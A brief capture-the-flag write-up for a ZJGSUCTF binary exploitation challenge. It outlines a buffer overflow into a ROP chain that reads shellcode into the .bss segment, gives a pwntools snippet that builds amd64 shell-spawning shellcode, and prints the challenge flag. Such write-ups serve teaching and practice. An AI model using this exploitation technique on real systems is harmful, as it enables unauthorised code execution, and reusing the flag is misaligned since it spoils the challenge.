@n132@

# Idea

- ret2shellcode
- ret2bss
- cover-up(I left the Leak_part deliberately for missleading.)

# Exploit

- buffer overflow to ROP:([rdi,0,rsi,bss,read,bss])
- send shellcode to get shell

```python
context.arch='amd64'
sh=asm(shellcraft.sh())
```

# Flag

`ZJGSUCTF{1765ee654ae66bc3acd747eeefe68c71}`
